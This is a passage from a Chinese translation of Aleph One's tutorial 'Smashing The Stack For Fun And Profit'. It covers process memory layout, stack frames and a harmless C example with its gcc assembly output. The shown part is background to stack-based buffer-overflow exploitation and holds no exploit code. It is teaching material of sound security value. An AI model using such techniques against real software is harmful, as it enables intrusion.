Underground.Org<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; bring you<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Smashing The Stack For Fun And Profit<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 以娱乐和牟利为目的践踏堆栈<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (缓冲区溢出的原理和实践)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 原作 by Aleph One<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; aleph1@underground.org<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 翻译 xuzq@chinasafer.com<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; www.chinasafer.com<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; '践踏堆栈'[C语言编程] n. 在许多C语言的实现中,有可能通过写入例程<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 中所声明的数组的结尾部分来破坏可执行的堆栈.所谓'践踏堆栈'使用的<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 代码可以造成例程的返回异常,从而跳到任意的地址.这导致了一些极为<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 险恶的数据相关漏洞(已人所共知).其变种包括堆栈垃圾化(trash the <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; stack),堆栈乱写(scribble the stack),堆栈毁坏(mangle the stack);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 术语mung the stack并不使用,因为这从来不是故意造成的.参阅spam?<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 也请参阅同名的漏洞,胡闹内核(fandango on core),内存泄露(memory <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; leak),优先权丢失(precedence lossage),螺纹滑扣(overrun screw).<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 简&nbsp;&nbsp; 介<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ~~~~~~~<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp; 在过去的几个月中,被发现和利用的缓冲区溢出漏洞呈现上升趋势.例如syslog,<BR>splitvt, sendmail 8.7.5, Linux/FreeBSD mount, Xt library, at等等.本文试图<BR>解释什么是缓冲区溢出, 以及如何利用.<BR><BR>&nbsp;&nbsp;&nbsp; 汇编的基础知识是必需的. 对虚拟内存的概念, 以及使用gdb的经验是十分有益<BR>的, 但不是必需的. 我们还假定使用Intel x86 CPU, 操作系统是Linux.<BR><BR>&nbsp;&nbsp;&nbsp; 在开始之前我们给出几个基本的定义: 缓冲区,简单说来是一块连续的计算机内<BR>存区域, 可以保存相同数据类型的多个实例. C程序员通常和字缓冲区数组打交道.<BR>最常见的是字符数组. 数组, 与C语言中所有的变量一样, 可以被声明为静态或动态<BR>的. 静态变量在程序加载时定位于数据段. 动态变量在程序运行时定位于堆栈之中.<BR>溢出, 说白了就是灌满, 使内容物超过顶端, 边缘, 或边界. 我们这里只关心动态<BR>缓冲区的溢出问题, 即基于堆栈的缓冲区溢出.<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 进程的内存组织形式<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ~~~~~~~~~~~~~~~~~~~~<BR>&nbsp;&nbsp;&nbsp; 为了理解什么是堆栈缓冲区, 我们必须首先理解一个进程是以什么组织形式在<BR>内存中存在的. 进程被分成三个区域: 文本, 数据和堆栈. 我们把精力集中在堆栈<BR>区域, 但首先按照顺序简单介绍一下其他区域.<BR><BR>&nbsp;&nbsp;&nbsp; 文本区域是由程序确定的, 包括代码(指令)和只读数据. 该区域相当于可执行<BR>文件的文本段. 这个区域通常被标记为只读, 任何对其写入的操作都会导致段错误<BR>(segmentation violation).<BR><BR>&nbsp;&nbsp;&nbsp; 数据区域包含了已初始化和未初始化的数据. 静态变量储存在这个区域中. 数<BR>据区域对应可执行文件中的data-bss段. 它的大小可以用系统调用brk(2)来改变.<BR>如果bss数据的扩展或用户堆栈把可用内存消耗光了, 进程就会被阻塞住, 等待有了<BR>一块更大的内存空间之后再运行. 新内存加入到数据和堆栈段的中间.<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /------------------\&nbsp; 内存低地址<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 文本&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |------------------|<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |&nbsp;&nbsp;&nbsp; (已初始化)&nbsp;&nbsp;&nbsp; |<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 数据&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |&nbsp;&nbsp;&nbsp; (未初始化)&nbsp;&nbsp;&nbsp; |<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |------------------|<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 堆栈&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; |&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; \------------------/&nbsp; 内存高地址<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Fig. 1 进程内存区域<BR><BR>&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 什么是堆栈?<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ~~~~~~~~~~~~~<BR><BR>&nbsp;&nbsp;&nbsp; 堆栈是一个在计算机科学中经常使用的抽象数据类型. 堆栈中的物体具有一个特性:<BR>最后一个放入堆栈中的物体总是被最先拿出来, 这个特性通常称为后进先处(LIFO)队列.<BR><BR>&nbsp;&nbsp;&nbsp; 堆栈中定义了一些操作. 两个最重要的是PUSH和POP. PUSH操作在堆栈的顶部加入一<BR>个元素. POP操作相反, 在堆栈顶部移去一个元素, 并将堆栈的大小减一.<BR><BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 为什么使用堆栈?<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ~~~~~~~~~~~~~~~~<BR>&nbsp;&nbsp;&nbsp; 现代计算机被设计成能够理解人们头脑中的高级语言. 在使用高级语言构造程序时<BR>最重要的技术是过程(procedure)和函数(function). 从这一点来看, 一个过程调用可<BR>以象跳转(jump)命令那样改变程序的控制流程, 但是与跳转不同的是, 当工作完成时,<BR>函数把控制权返回给调用之后的语句或指令. 这种高级抽象实现起来要靠堆栈的帮助.<BR><BR>&nbsp;&nbsp;&nbsp; 堆栈也用于给函数中使用的局部变量动态分配空间, 同样给函数传递参数和函数返<BR>回值也要用到堆栈.<BR><BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 堆栈区域<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ~~~~~~~~~~<BR>&nbsp;&nbsp;&nbsp; 堆栈是一块保存数据的连续内存. 一个名为堆栈指针(SP)的寄存器指向堆栈的顶部.<BR>堆栈的底部在一个固定的地址. 堆栈的大小在运行时由内核动态地调整. CPU实现指令<BR>PUSH和POP, 向堆栈中添加元素和从中移去元素.<BR><BR>&nbsp;&nbsp;&nbsp; 堆栈由逻辑堆栈帧组成. 当调用函数时逻辑堆栈帧被压入栈中, 当函数返回时逻辑<BR>堆栈帧被从栈中弹出. 堆栈帧包括函数的参数, 函数地局部变量, 以及恢复前一个堆栈<BR>帧所需要的数据, 其中包括在函数调用时指令指针(IP)的值.&nbsp;&nbsp; <BR><BR>&nbsp;&nbsp;&nbsp; 堆栈既可以向下增长(向内存低地址)也可以向上增长, 这依赖于具体的实现. 在我<BR>们的例子中, 堆栈是向下增长的. 这是很多计算机的实现方式, 包括Intel, Motorola,<BR>SPARC和MIPS处理器. 堆栈指针(SP)也是依赖于具体实现的. 它可以指向堆栈的最后地址,<BR>或者指向堆栈之后的下一个空闲可用地址. 在我们的讨论当中, SP指向堆栈的最后地址.<BR><BR>&nbsp;&nbsp;&nbsp; 除了堆栈指针(SP指向堆栈顶部的的低地址)之外, 为了使用方便还有指向帧内固定<BR>地址的指针叫做帧指针(FP). 有些文章把它叫做局部基指针(LB-local base pointer).<BR>从理论上来说, 局部变量可以用SP加偏移量来引用. 然而, 当有字被压栈和出栈后, 这<BR>些偏移量就变了. 尽管在某些情况下编译器能够跟踪栈中的字操作, 由此可以修正偏移<BR>量, 但是在某些情况下不能. 而且在所有情况下, 要引入可观的管理开销. 而且在有些<BR>机器上, 比如Intel处理器, 由SP加偏移量访问一个变量需要多条指令才能实现.<BR><BR>&nbsp;&nbsp;&nbsp; 因此, 许多编译器使用第二个寄存器, FP, 对于局部变量和函数参数都可以引用, <BR>因为它们到FP的距离不会受到PUSH和POP操作的影响. 在Intel CPU中, BP(EBP)用于这<BR>个目的. 在Motorola CPU中, 除了A7(堆栈指针SP)之外的任何地址寄存器都可以做FP.<BR>考虑到我们堆栈的增长方向, 从FP的位置开始计算, 函数参数的偏移量是正值, 而局部<BR>变量的偏移量是负值.<BR><BR>&nbsp;&nbsp;&nbsp; 当一个例程被调用时所必须做的第一件事是保存前一个FP(这样当例程退出时就可以<BR>恢复). 然后它把SP复制到FP, 创建新的FP, 把SP向前移动为局部变量保留空间. 这称为<BR>例程的序幕(prolog)工作. 当例程退出时, 堆栈必须被清除干净, 这称为例程的收尾<BR>(epilog)工作. Intel的ENTER和LEAVE指令, Motorola的LINK和UNLINK指令, 都可以用于<BR>有效地序幕和收尾工作.<BR><BR>&nbsp;&nbsp;&nbsp; 下面我们用一个简单的例子来展示堆栈的模样:<BR>&nbsp;&nbsp;&nbsp; <BR>example1.c:<BR>------------------------------------------------------------------------------<BR>void function(int a, int b, int c) {<BR>&nbsp;&nbsp; char buffer1[5];<BR>&nbsp;&nbsp; char buffer2[10];<BR>}<BR><BR>void main() {<BR>&nbsp; function(1,2,3);<BR>}<BR>------------------------------------------------------------------------------&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR> <BR>&nbsp;&nbsp;&nbsp; 为了理解程序在调用function()时都做了哪些事情, 我们使用gcc的-S选项编译, 以产<BR>生汇编代码输出:<BR><BR>$ gcc -S -o example1.s example1.c<BR><BR>&nbsp;&nbsp;&nbsp; 通过查看汇编语言输出, 我们看到对function()的调用被翻译成:<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pushl $3<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pushl $2<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pushl $1<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; call function<BR>&nbsp; <BR>&nbsp;&nbsp;&nbsp; 以从后往前的顺序将function的三个参数压入栈中, 然后调用function(). 指令call<BR>会把指令指针(IP)也压入栈中. 我们把这被保存的IP称为返回地址(RET). 在函数中所做<BR>的第一件事情是例程的序幕工作:<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pushl %ebp<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; movl %esp,%ebp<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; subl $20,%esp<BR><BR>&nbsp;&nbsp;&nbsp; 将帧指针EBP压入栈中. 然后把当前的SP复制到EBP, 使其成为新的帧指针. 我们把这<BR>个被保存的FP叫做SFP. 接下来将SP的值减小, 为局部变量保留空间.<BR><BR>&nbsp;&nbsp;&nbsp; 我们必须牢记:内存只能以字为单位寻址. 在这里一个字是4个字节, 32位. 因此5字节<BR>的缓冲区会占用8个字节(2个字)的内存空间, 而10个字节的缓冲区会占用12个字节(3个字)<BR>的内存空间. 这就是为什么SP要减掉20的原因. 这样我们就可以想象function()被调用时<BR>堆栈的模样(每个空格代表一个字节):<BR><BR><BR>内存低地址&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 内存高地址<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; buffer2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; buffer1&nbsp;&nbsp; sfp&nbsp;&nbsp; ret&nbsp;&nbsp; a&nbsp;&nbsp;&nbsp;&nbsp; b&nbsp;&nbsp;&nbsp;&nbsp; c<BR>&lt;------&nbsp;&nbsp; [&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ][&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ][&nbsp;&nbsp;&nbsp; ][&nbsp;&nbsp;&nbsp; ][&nbsp;&nbsp;&nbsp; ][&nbsp;&nbsp;&nbsp; ][&nbsp;&nbsp;&nbsp; ]<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>堆栈顶部&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 堆栈底部<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 